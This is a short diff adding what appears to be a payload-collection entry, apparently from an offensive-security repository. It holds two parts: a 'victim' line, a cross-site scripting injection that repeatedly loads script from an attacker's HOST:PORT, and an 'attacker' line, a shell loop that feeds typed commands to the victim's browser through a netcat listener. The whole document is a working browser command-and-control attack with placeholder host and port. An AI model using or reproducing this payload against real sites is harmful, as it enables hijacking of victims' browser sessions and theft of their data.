@@ -1,0 +1,6 @@
+victim:
+'-setInterval(function(){a=document;b=a.createElement("script");b.src="//HOST:PORT";a.body.appendChild(b)},0)-'
+
+
+attacker:
+clear && while :; do printf "ZephrFish$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
